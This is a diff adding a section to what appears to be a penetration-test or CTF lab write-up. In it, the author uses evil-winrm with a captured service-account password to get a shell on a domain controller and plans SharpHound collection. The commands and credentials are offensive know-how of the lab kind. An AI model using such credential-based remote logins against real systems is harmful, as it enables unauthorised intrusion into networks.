@@ -265,5 +265,23 @@ RDP         10.1.33.56      3389   DC01             [+] DRY.MARTINI.BARS\athena_
 ```
 This user also has access over RDP
 
+# Using sharphound to collect bloodhound data
+
+Since regular bloodhound collection failed ill use sharphound now i have WINRM access
+
+```python
+evil-winrm -i dc01.dry.martini.bars -u 'athena_svc' -p '1dirtymartini'               
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents>
+```
+I now have access over WEIU
+
 
 
